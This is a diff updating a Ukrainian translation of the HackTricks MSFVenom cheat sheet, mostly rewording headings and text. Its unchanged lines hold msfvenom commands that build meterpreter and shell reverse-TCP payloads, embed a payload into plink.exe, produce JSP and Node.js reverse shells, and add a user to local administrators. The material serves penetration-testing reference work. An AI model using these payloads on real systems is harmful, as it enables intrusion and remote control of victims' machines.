@@ -1,8 +1,10 @@
-# MSFVenom - CheatSheet
+# MSFVenom - Шпаргалка
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ---
 
-## Базове msfvenom
+## Основи msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
@@ -13,7 +15,7 @@
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-Ці команди виводять список payload і encoder-модулів, доступних в установленому framework.<sup>[[1]](#references)</sup>
+Ці команди перелічують модулі payload і encoder, доступні в установленому фреймворку.<sup>[[1]](#references)</sup>
 
 ## Поширені параметри під час створення shellcode
 ```bash
@@ -52,7 +54,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Вбудований у виконуваний файл
+### Вбудовано у виконуваний файл
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Скриптові payloads**
+## **Payloads скриптових мов**
 
 ### **Perl**
 ```bash
